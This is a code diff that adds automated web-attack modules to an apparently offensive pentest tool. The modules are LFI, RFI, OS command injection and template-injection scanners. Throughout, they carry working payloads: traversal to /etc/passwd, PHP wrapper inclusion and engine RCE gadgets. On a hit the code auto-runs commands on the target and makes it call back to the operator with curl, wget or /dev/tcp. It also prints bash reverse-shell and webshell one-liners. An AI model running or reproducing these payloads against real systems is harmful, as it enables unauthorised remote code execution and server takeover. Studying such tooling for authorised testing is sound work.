+_LFI_MAX_PARAMS = 20
+
+
+def _gather_lfi_targets(ip: str, port: int, proto: str) -> list:
+    """(hostval, path, param) with file-like params first (LFI most likely there)."""
+    ts = _gather_sqli_targets(ip, port, proto)
+    ts.sort(key=lambda t: 0 if _LFI_FILE_PARAM.search(t[2]) else 1)
+    return ts[:_LFI_MAX_PARAMS]
+
+
+def _tool_lfi_scan(ip: str, port: int, proto: str) -> str:
+    """HTTP step tool: LFI / path traversal on file-like params (host + vhosts). Read-only
+    payloads (traversal depths, URL/double-encoding, php:// wrappers, /proc, Windows); each
+    hit is CONFIRMED by file-content signature (passwd line / win.ini / environ / base64→<?php)
+    so a soft-error page can't cause a false positive. Auto-reads source via php://filter and
+    harvests usernames from /etc/passwd; RCE (log poisoning etc.) is printed as a command,
+    not run. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import base64
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _probe(hostval, path, param, payload):
+        conn = None
+        q = f"{path}?{param}={payload}"                       # payloads are pre-encoded — send raw
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=8)
+            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            return resp.status, resp.read(200000).decode("utf-8", "replace")
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _probe(ip, "/", "x", "1")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test LFI")
+
+    targets = _gather_lfi_targets(ip, port, proto)
+    results = {}
+    lock = threading.Lock()
+
+    def _b64_php(body):
+        for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", body or ""):
+            try:
+                dec = base64.b64decode(blob).decode("utf-8", "replace")
+            except Exception:                                 # noqa: BLE001
+                continue
+            if "<?php" in dec or "<?=" in dec:
+                return dec
+        return None
+
+    def _test(hostval, path, param):
+        found = []
+        # 1) /etc/passwd via traversal / wrappers
+        for pl in _LFI_PASSWD:
+            _st, body = _probe(hostval, path, param, pl)
+            if body and _LFI_SIG_PASSWD.search(body):
+                users = re.findall(r"^([a-zA-Z_][\w.-]*):[^:\n]*:\d+", body, re.M)
+                found.append(("passwd", pl, users[:12]))
+                break
+        # 2) Windows win.ini
+        for pl in _LFI_WIN:
+            _st, body = _probe(hostval, path, param, pl)
+            if body and _LFI_SIG_WIN.search(body):
+                found.append(("win.ini", pl, []))
+                break
+        # 3) /proc/self/environ (RCE vector via UA poisoning)
+        for pl in _LFI_ENVIRON:
+            _st, body = _probe(hostval, path, param, pl)
+            if body and _LFI_SIG_ENVIRON.search(body):
+                found.append(("environ", pl, []))
+                break
+        # 4) php://filter source disclosure (auto-read, safe enumeration)
+        for pl in _LFI_PHPSRC:
+            _st, body = _probe(hostval, path, param, pl)
+            src = _b64_php(body)
+            if src:
+                found.append(("php-src", pl, [src[:120].replace("\n", " ")]))
+                break
+        if found:
+            with lock:
+                results.setdefault(hostval, []).append((path, param, found))
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path, param = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _test(hostval, path, param)
+            finally:
+                q.task_done()
+
+    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_LFI_THREADS)]
+    for t in ths:
+        t.start()
+    for t in ths:
+        t.join()
+
+    lines = [f"{scheme}://{ip}:{port}/ LFI / path traversal scan",
+             f"params tested: {len(targets)} · "
+             f"injectable {sum(len(v) for v in results.values())}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            for path, param, found in results[hostval]:
+                kinds = ", ".join(k for k, _p, _x in found)
+                lines.append(f"  ✗ LFI {path}?{param}  ({kinds})")
+                for kind, pl, extra in found:
+                    if kind == "passwd":
+                        lines.append(f"      /etc/passwd via {pl}")
+                        if extra:
+                            lines.append(f"      users: {', '.join(extra)}")
+                    elif kind == "win.ini":
+                        lines.append(f"      windows read via {pl}")
+                    elif kind == "environ":
+                        lines.append(f"      /proc/self/environ readable via {pl}")
+                    elif kind == "php-src":
+                        lines.append(f"      php://filter source readable ({pl})")
+                        if extra:
+                            lines.append(f"        {extra[0]}")
+                url = f"{scheme}://{ip}:{port}{path}?{param}="
+                lines.append(f"      RCE (manual): curl '{url}/var/log/apache2/access.log' "
+                             f"-A '<?php system($_GET[0]);?>' ; then {url}/var/log/apache2/access.log&0=id")
+    else:
+        lines.append("\nno LFI / path traversal found")
+    return "\n".join(lines)
+
+
+_RFI_DEADLINE = 120
+_RFI_THREADS = 8
+_RFI_MAX_PARAMS = 20
+
+
+def _tool_rfi_scan(ip: str, port: int, proto: str) -> str:
+    """HTTP step tool: RFI / wrapper inclusion on file-like params (host + vhosts). Instead of
+    hammering remote http (needs your server), it confirms inclusion/execution locally with a
+    unique marker via data:// (plain + base64), php://input and expect://. A marker echoed
+    WITHOUT the raw <?php text = code executed (allow_url_include on → RCE-capable); marker with
+    raw code = wrapper included as text only. Non-destructive (echo marker); remote webshell is a
+    printed command, not run. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import base64
+    import random
+    import string
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+    marker = "pshRFI" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+    php = f"<?php echo '{marker}'; ?>"
+    b64 = base64.b64encode(php.encode()).decode()
+    # each: (label, method, payload, reflect-literal) — the literal is what a plain reflection
+    # of the payload would put around the marker; if it's in the body the marker was only
+    # echoed back as TEXT (not executed). base64 hides the marker, so its plaintext = exec.
+    payloads = [
+        ("data://", "GET", f"data://text/plain,{php}", f"echo '{marker}'"),
+        ("data://base64", "GET", f"data://text/plain;base64,{b64}", None),
+        ("php://input", "POST", php, f"echo '{marker}'"),
+        ("expect://", "GET", f"expect://echo {marker}", f"echo {marker}"),
+    ]
+
+    def _req(hostval, method, path, param, value, body=None):
+        conn = None
+        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=8)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if body is not None:
+                hdr["Content-Type"] = "text/plain"
+            conn.request(method, q, body=body, headers=hdr)
+            resp = conn.getresponse()
+            return resp.status, resp.read(100000).decode("utf-8", "replace")
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _req(ip, "GET", "/", "x", "1")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test RFI")
+
+    targets = _gather_lfi_targets(ip, port, proto)[:_RFI_MAX_PARAMS]
+    results = {}
+    lock = threading.Lock()
+
+    def _classify(body, lit):
+        if not body or marker not in body:
+            return None
+        if "<?php" in body or (lit and lit in body):         # payload echoed back verbatim
+            return "include"                                 # included/reflected as text, not run
+        return "exec"
+
+    def _test(hostval, path, param):
+        # only EXEC is reliable RFI evidence — plain reflection of a data:// payload is just
+        # reflection (XSS), not inclusion, so we don't report a text-only "include" verdict.
+        for kind, method, data, lit in payloads:
+            if method == "POST":
+                r = _req(hostval, "POST", path, param, "php://input", body=data)
+            else:
+                r = _req(hostval, "GET", path, param, data)
+            if _classify(r[1], lit) == "exec":
+                # RCE confirmed → verify egress so the reverse-shell info is checked, not guessed
+                def _run(c, _h=hostval, _p=path, _pa=param):
+                    self_payload = f"data://text/plain,<?php system('{c}'); ?>"
+                    _req(_h, "GET", _p, _pa, self_payload)
+                cb = _verify_rce_callback(ip, _run)
+                with lock:
+                    results.setdefault(hostval, []).append((path, param, "exec", kind, cb))
+                return
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path, param = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _test(hostval, path, param)
+            finally:
+                q.task_done()
+
+    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_RFI_THREADS)]
+    for t in ths:
+        t.start()
+    for t in ths:
+        t.join()
+
+    lines = [f"{scheme}://{ip}:{port}/ RFI / wrapper inclusion scan",
+             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            for path, param, _verdict, via, cb in results[hostval]:
+                lines.append(f"  ✗ RFI {path}?{param}  ({via} exec — RCE-capable; allow_url_include ON)")
+                url = f"{scheme}://{ip}:{port}{path}?{param}="
+                ok, addr = cb if cb else (False, None)
+                if ok:
+                    myip = addr.split(":")[0]
+                    lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
+                    rev = f"data://text/plain,<?php system('bash -c \"bash -i >%26 /dev/tcp/{myip}/4444 0>%261\"'); ?>"
+                    lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}): "
+                                 f"{url}{urllib.parse.quote(rev, safe='')}")
+                else:
+                    lines.append(f"      egress NOT confirmed (code-exec proven) — remote webshell: "
+                                 f"{url}http://<YOUR_IP>/shell.txt # shell.txt = <?php system($_GET[0]);?>")
+    else:
+        lines.append("\nno RFI / wrapper inclusion found")
+    return "\n".join(lines)
+
+
+# OS command injection — params that often reach a shell, tested first.
+_CMDI_SUSPECT = re.compile(
+    r"host|ip|ping|cmd|exec|dns|domain|url|file|name|query|target|addr|command|run|"
+    r"search|lookup|nslookup|trace|port", re.I)
+_CMDI_DEADLINE = 240
+_CMDI_THREADS = 6
+_CMDI_REQ_TIMEOUT = 10
+_CMDI_TIME_DELAY = 5
+_CMDI_MAX_PARAMS = 20
+_CMDI_MAX_TIME_PARAMS = 10
+
+
+def _gather_cmdi_targets(ip: str, port: int, proto: str) -> list:
+    ts = _gather_sqli_targets(ip, port, proto)
+    ts.sort(key=lambda t: 0 if _CMDI_SUSPECT.search(t[2]) else 1)
+    return ts[:_CMDI_MAX_PARAMS]
+
+
+def _verify_rce_callback(target_ip: str, run_cmd, timeout: int = 8) -> "tuple":
+    """Prove a confirmed RCE can reach us back (so a reverse shell will work) WITHOUT giving a
+    shell: open a short-lived listener, have the target hit it via run_cmd (a closure that runs
+    a shell command through the vector), wait for the marked connection, tear it down. Returns
+    (ok, "ip:port"). ip is our address the target actually routed to."""
+    import socket
+    import threading
+    import random
+    import string
+    try:                                                     # our source IP toward the target
+        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        u.connect((target_ip, 9))
+        myip = u.getsockname()[0]
+        u.close()
+    except Exception:                                        # noqa: BLE001
+        return False, None
+    try:
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind(("0.0.0.0", 0))
+        srv.listen(1)
+        srv.settimeout(timeout)
+    except Exception:                                        # noqa: BLE001
+        return False, None
+    cbport = srv.getsockname()[1]
+    marker = "pshCB" + "".join(random.choices(string.ascii_lowercase, k=6))
+    got = {"ok": False}
+
+    def _accept():
+        try:
+            conn, _ = srv.accept()
+            data = conn.recv(2048)
+            if marker.encode() in data:
+                got["ok"] = True
+            try:                                             # reply so the target's curl/wget returns
+                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+            except Exception:                                # noqa: BLE001
+                pass
+            conn.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+    th = threading.Thread(target=_accept, daemon=True)
+    th.start()
+    url = f"http://{myip}:{cbport}/{marker}"
+    for c in (f"curl -s {url}", f"wget -qO- {url}",
+              f"python3 -c \"import urllib.request as u;u.urlopen('{url}')\"",
+              f"exec 3<>/dev/tcp/{myip}/{cbport}; echo -e 'GET /{marker} HTTP/1.0\\r\\n\\r\\n' >&3"):
+        try:
+            run_cmd(c)
+        except Exception:                                    # noqa: BLE001
+            pass
+        th.join(timeout=max(2, timeout // 3))
+        if got["ok"]:
+            break
+    try:
+        srv.close()
+    except Exception:                                        # noqa: BLE001
+        pass
+    return got["ok"], f"{myip}:{cbport}"
+
+
+def _tool_cmdi_scan(ip: str, port: int, proto: str) -> str:
+    """HTTP step tool: OS command injection on params (host + vhosts). Output-based uses a
+    COMPUTED marker (echo pshOS$((a+b))) so only real shell arithmetic — not a reflected
+    payload — counts (near-zero FP); time-based (sleep / ping) with a control + confirm catches
+    the blind case. On an output-based hit it auto-runs read-only id / whoami / uname / hostname
+    to prove RCE and show privilege. Reverse shell is a printed command, not run. Stdlib only."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+    deadline = time.time() + _CMDI_DEADLINE
+
+    # separators → how to wrap a command CMD into the injected value
+    wraps = [
+        ("; ", lambda c: f"1;{c}"),
+        ("| ", lambda c: f"1|{c}"),
+        ("&& ", lambda c: f"1&&{c}"),
+        ("$(...)", lambda c: f"1$({c})"),
+        ("`...`", lambda c: f"1`{c}`"),
+        ("newline", lambda c: f"1\n{c}"),
+    ]
+    time_wraps = [
+        ("; sleep", lambda n: f"1;sleep {n}"),
+        ("| sleep", lambda n: f"1|sleep {n}"),
+        ("&& sleep", lambda n: f"1&&sleep {n}"),
+        ("$(sleep)", lambda n: f"1$(sleep {n})"),
+        ("`sleep`", lambda n: f"1`sleep {n}`"),
+        ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
+    ]
+
+    def _get(hostval, path, param, value):
+        conn = None
+        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
+        t0 = time.perf_counter()
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_CMDI_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_CMDI_REQ_TIMEOUT)
+            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            return resp.status, resp.read(100000).decode("utf-8", "replace"), time.perf_counter() - t0
+        except Exception:                                     # noqa: BLE001
+            return None, None, time.perf_counter() - t0
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _get(ip, "/", "x", "1")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test cmd injection")
+
+    targets = _gather_cmdi_targets(ip, port, proto)
+    results = {}
+    lock = threading.Lock()
+    time_pool = []
+
+    def _test_output(hostval, path, param):
+        a, b = random.randint(1000, 9000), random.randint(1000, 9000)
+        token = f"pshOS{a + b}zz"
+        cmd = f"echo pshOS$(({a}+{b}))zz"
+        for label, wrap in wraps:
+            if time.time() >= deadline:
+                return None
+            _st, body, _el = _get(hostval, path, param, wrap(cmd))
+            if body and token in body:                        # computed → shell ran it
+                return (label, wrap)
+        return None
+
+    def _run(hostval, path, param, wrap, cmd):
+        dm = "pshE" + "".join(random.choices("abcdef0123456789", k=6))
+        _st, body, _el = _get(hostval, path, param, wrap(f"echo {dm}$({cmd}){dm}"))
+        m = re.search(re.escape(dm) + r"(.*?)" + re.escape(dm), body or "", re.S)
+        return " ".join(m.group(1).split())[:120] if m else None
+
+    def _test_time(hostval, path, param):
+        lat = min(_get(hostval, path, param, "1")[2], _get(hostval, path, param, "1")[2])
+        for label, tpl in time_wraps:
+            if time.time() >= deadline:
+                return None
+            c_el = _get(hostval, path, param, tpl(0))[2]
+            t_el = _get(hostval, path, param, tpl(_CMDI_TIME_DELAY))[2]
+            if t_el >= _CMDI_TIME_DELAY * 0.7 and (t_el - max(lat, c_el)) >= _CMDI_TIME_DELAY * 0.6:
+                t2 = _get(hostval, path, param, tpl(_CMDI_TIME_DELAY))[2]
+                if t2 >= _CMDI_TIME_DELAY * 0.7:
+                    return label
+        return None
+
+    def _test(hostval, path, param):
+        hit = _test_output(hostval, path, param)
+        if hit:
+            label, wrap = hit
+            enum = [(n, _run(hostval, path, param, wrap, c))
+                    for n, c in (("id", "id"), ("whoami", "whoami"),
+                                 ("uname", "uname -a"), ("host", "hostname"))]
+            # verify egress through the CONFIRMED separator only (one callback, not all six)
+            cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, wrap(c)))
+            with lock:
+                results.setdefault(hostval, []).append((path, param, "echo", label, enum, cb))
+            return
+        with lock:
+            time_pool.append((hostval, path, param))          # try time-based later (sequential)
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path, param = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _test(hostval, path, param)
+            finally:
+                q.task_done()
+
+    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_CMDI_THREADS)]
+    for t in ths:
+        t.start()
+    for t in ths:
+        t.join()
+
+    for hostval, path, param in time_pool[:_CMDI_MAX_TIME_PARAMS]:   # timing-sensitive → sequential
+        if time.time() >= deadline:
+            break
+        lbl = _test_time(hostval, path, param)
+        if lbl:                                               # blind: run commands via the ';' separator
+            cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, wraps[0][1](c)))
+            results.setdefault(hostval, []).append((path, param, "time", lbl, None, cb))
+
+    lines = [f"{scheme}://{ip}:{port}/ OS command injection scan",
+             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            for path, param, kind, label, enum, cb in results[hostval]:
+                lines.append(f"  ✗ CMDI {path}?{param}  ({kind}-based, {label})")
+                if enum:
+                    for n, val in enum:
+                        if val:
+                            lines.append(f"      {n}: {val}")
+                else:
+                    lines.append("      blind (no output reflected)")
+                ok, addr = cb if cb else (False, None)
+                if ok:
+                    myip = addr.split(":")[0]
+                    lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
+                    lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}, then run): "
+                                 f"1;bash -c 'bash -i >& /dev/tcp/{myip}/4444 0>&1'")
+                else:
+                    lines.append("      egress NOT confirmed (RCE proven above; outbound may be firewalled) — "
+                                 "reverse shell: 1;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'")
+    else:
+        lines.append("\nno OS command injection found")
+    return "\n".join(lines)
+
+
+# SSTI: template syntaxes for the math probe, then per-family RCE gadgets (run a command).
+_SSTI_SYNTAX = [
+    ("{{ }}", lambda e: "{{" + e + "}}"),
+    ("${ }", lambda e: "${" + e + "}"),
+    ("#{ }", lambda e: "#{" + e + "}"),
+    ("<%= %>", lambda e: "<%= " + e + " %>"),
+    ("{ }", lambda e: "{" + e + "}"),
+    ("@( )", lambda e: "@(" + e + ")"),
+]
+# family -> [(engine, gadget(cmd) -> payload)] — gadgets run a shell command via the engine
+_SSTI_GADGETS = {
+    "{{ }}": [
+        ("Jinja2", lambda c: "{{cycler.__init__.__globals__.os.popen('" + c + "').read()}}"),
+        ("Jinja2", lambda c: "{{lipsum.__globals__.os.popen('" + c + "').read()}}"),
+        ("Twig", lambda c: "{{['" + c + "']|filter('system')}}"),
+        ("Nunjucks", lambda c: "{{range.constructor(\"return global.process.mainModule."
+                               "require('child_process').execSync('" + c + "')\")()}}"),
+    ],
+    "${ }": [
+        ("Freemarker", lambda c: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + c + '")}'),
+        ("Mako", lambda c: "${__import__('os').popen('" + c + "').read()}"),
+        ("Smarty", lambda c: "${system('" + c + "')}"),
+    ],
+    "<%= %>": [
+        ("ERB", lambda c: "<%= `" + c + "` %>"),
+        ("ERB", lambda c: "<%= IO.popen('" + c + "').read %>"),
+    ],
+    "{ }": [
+        ("Smarty", lambda c: "{system('" + c + "')}"),
+        ("Smarty", lambda c: "{php}system('" + c + "');{/php}"),
+    ],
+}
+_SSTI_DEADLINE = 150
+_SSTI_THREADS = 8
+_SSTI_MAX_PARAMS = 20
+
+
+def _tool_ssti_scan(ip: str, port: int, proto: str) -> str:
+    """HTTP step tool: server-side template injection. A COMPUTED math marker ({{a*b}} etc.)
+    across template syntaxes confirms evaluation (not reflection) with near-zero FP; then, for
+    the matching syntax family, engine RCE gadgets run a read-only `id` — a `uid=` in the reply
+    confirms RCE and identifies the engine. The findings carry a confirmed command-execution
+    one-liner (swap `id` for anything). Only a reverse shell needs your listener. Stdlib only."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+    deadline = time.time() + _SSTI_DEADLINE
+
+    def _get(hostval, path, param, value):
+        conn = None
+        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=8, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=8)
+            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            return resp.status, resp.read(100000).decode("utf-8", "replace")
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _get(ip, "/", "x", "1")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test SSTI")
+
+    targets = _gather_sqli_targets(ip, port, proto)[:_SSTI_MAX_PARAMS]
+    results = {}
+    lock = threading.Lock()
+
+    def _test(hostval, path, param):
+        a, b = random.randint(100, 999), random.randint(100, 999)
+        prod, expr = str(a * b), f"{a}*{b}"
+        family = None
+        for fam, mk in _SSTI_SYNTAX:
+            if time.time() >= deadline:
+                return
+            _st, body = _get(hostval, path, param, mk(expr))
+            if body and prod in body and expr not in body:    # computed → template evaluated
+                family = fam
+                break
+        if not family:
+            return
+        engine, idout, run_gadget, cb = None, None, None, None
+        for eng, gad in _SSTI_GADGETS.get(family, []):
+            if time.time() >= deadline:
+                break
+            _st, body = _get(hostval, path, param, gad("id"))
+            m = re.search(r"uid=\d+\([^)]*\)[^\n<]*", body or "")
+            if m:
+                engine, idout, run_gadget = eng, m.group(0).strip(), gad
+                cb = _verify_rce_callback(ip, lambda c: _get(hostval, path, param, run_gadget(c)))
+                break
+        with lock:
+            results.setdefault(hostval, []).append((path, param, family, engine, idout, run_gadget, cb))
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path, param = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _test(hostval, path, param)
+            finally:
+                q.task_done()
+
+    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_SSTI_THREADS)]
+    for t in ths:
+        t.start()
+    for t in ths:
+        t.join()
+
+    lines = [f"{scheme}://{ip}:{port}/ SSTI (server-side template injection) scan",
+             f"params tested: {len(targets)} · vulnerable {sum(len(v) for v in results.values())}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            for path, param, family, engine, idout, gad, cb in results[hostval]:
+                url = f"{scheme}://{ip}:{port}{path}?{param}="
+                if engine and gad:
+                    lines.append(f"  ✗ SSTI {path}?{param}  ({family} → {engine}, RCE confirmed)")
+                    lines.append(f"      id: {idout}")
+                    cmd_payload = urllib.parse.quote(gad("$CMD"), safe="")
+                    lines.append(f"      run any cmd: curl '{url}{cmd_payload}'  "
+                                 f"# replace $CMD with your command (confirmed via id above)")
+                    ok, addr = cb if cb else (False, None)
+                    if ok:
+                        myip = addr.split(":")[0]
+                        rev = gad(f"bash -c 'bash -i >& /dev/tcp/{myip}/4444 0>&1'")
+                        lines.append(f"      egress VERIFIED: target reached us at {addr} — reverse shell works")
+                        lines.append(f"      reverse shell (start 'nc -lvnp 4444' on {myip}): "
+                                     f"curl '{url}{urllib.parse.quote(rev, safe='')}'")
+                    else:
+                        rev = gad("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'")
+                        lines.append(f"      egress NOT confirmed (RCE proven above) — reverse shell: "
+                                     f"curl '{url}{urllib.parse.quote(rev, safe='')}' # set YOUR_IP + nc -lvnp 4444")
+                else:
+                    lines.append(f"  ⚠ SSTI {path}?{param}  ({family} evaluated — engine RCE gadget "
+                                 f"not auto-confirmed; try engine-specific payloads)")
+    else:
+        lines.append("\nno SSTI found")
+    return "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("curl -sI (HTTP headers)", _tool_http_headers),
+    "http-fingerprint": ("whatweb (stack fingerprint)", _tool_http_fingerprint),
+    "ssl-cert": ("openssl (TLS cert → hostnames/emails)", _tool_tls_cert),
+    "searchsploit": ("searchsploit (Exploit-DB by version)", _tool_searchsploit),
+    "http-source": ("view-source + JS mining (endpoints/secrets)", _tool_http_source),
+    "http-wellknown": ("robots/sitemap/.well-known + error page", _tool_http_wellknown),
+    "http-cookies": ("cookie flags + JWT (alg:none / weak secret)", _tool_http_cookies),
+    "vhost-fuzz": ("vhost sweep (stdlib) → hidden apps on this IP", _tool_vhost_fuzz),
+    "dir-brute": ("content sweep (stdlib) → dirs/files per host+vhost", _tool_dir_brute),
+    "vcs-hunt": ("VCS/backup/config hunt (stdlib, signature-checked)", _tool_vcs_hunt),
+    "param-hunt": ("hidden param discovery (stdlib) → dynamic endpoints", _tool_param_hunt),
+    "default-creds": ("default creds check (stdlib) → Basic + login forms", _tool_default_creds),
+    "auth-bypass": ("auth bypass (SQLi) + user enumeration (stdlib)", _tool_auth_bypass),
+    "login-brute": ("targeted login brute (stdlib, gated) → Basic + forms", _tool_login_brute),
+    "sqli-scan": ("SQLi scan (stdlib: error/boolean/time) + sqlmap enum/dump", _tool_sqli_scan),
+    "sqli-dump": ("SQLi auto-dump (OSCP-safe, no sqlmap) → UNION/error/blind", _tool_sqli_dump),
+    "lfi-scan": ("LFI / path traversal (stdlib, content-verified) → php://filter, /proc", _tool_lfi_scan),
+    "rfi-scan": ("RFI / wrapper inclusion (stdlib) → data://, php://input", _tool_rfi_scan),
+    "cmdi-scan": ("OS command injection (stdlib: echo/time) → id/uname, RCE cmd", _tool_cmdi_scan),
+    "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
 }
+
+# tools that harvest hostnames → maintain the managed /etc/hosts block (root) / show the
+# paste line (no root); used to print the right sudo notice at launch
+_HOSTS_WRITING_TOOLS = {"http-headers", "ssl-cert", "http-source", "vhost-fuzz"}
 
 # status glyph + colour for a checklist step
 _STEP_MARK = {"done": ("✓", GREEN), "skip": ("⊘", MAGENTA), "running": ("⏳", YELLOW),
@@ -2678,6 +6334,7 @@ def _render_exploit_checklist(ip: str, target: tuple) -> None:
     """One service's pentest checklist: each step with its status (○ to-do / ✓ done /
     ⊘ skip) and, when one is wired, the tool that can run it."""
     port, proto, label, key, ver, signal = target
+    _sync_hosts_block(ip)     # entering a host's checklist as root materialises its DB domains → hosts
     steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
     status = fetch_step_status(ip, port, proto, key)
     print(f"\n{BOLD}{label} — checklist{RESET}  {DIM}{ip}:{port}/{proto}{RESET}")
@@ -2688,9 +6345,11 @@ def _render_exploit_checklist(ip: str, target: tuple) -> None:
         desc, tool_key = _step_parts(step)
         st = status.get(i)
         sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
-        body = f"{col}{desc}{RESET}" if st in ("done", "skip") else desc   # done → green line
+        has_tool = bool(tool_key and tool_key in _STEP_TOOLS)
+        text = f"{BOLD}{desc}{RESET}" if has_tool else desc   # wired (runnable) → bold
+        body = f"{col}{text}{RESET}" if st in ("done", "skip") else text  # done → green line
         print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")
-        if tool_key and tool_key in _STEP_TOOLS:
+        if has_tool:
             print(f"        {DIM}→ {_STEP_TOOLS[tool_key][0]}  ·  run with {BOLD}r {i}{RESET}")
 
 
@@ -2717,6 +6376,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
     never blocks); marks the step ⏳ running now, ✓ done when it finishes. Output lands in
     the port's DETAILS / [f] findings, viewable in status."""
     port, proto, _label, key, _ver, _signal = target
+    _sync_hosts_block(ip)     # running any checklist tool materialises this host's DB domains → hosts (root)
     steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
     if not 1 <= n <= len(steps):
         print(f"{RED}✗ no step {n}{RESET}")
@@ -2728,13 +6388,75 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
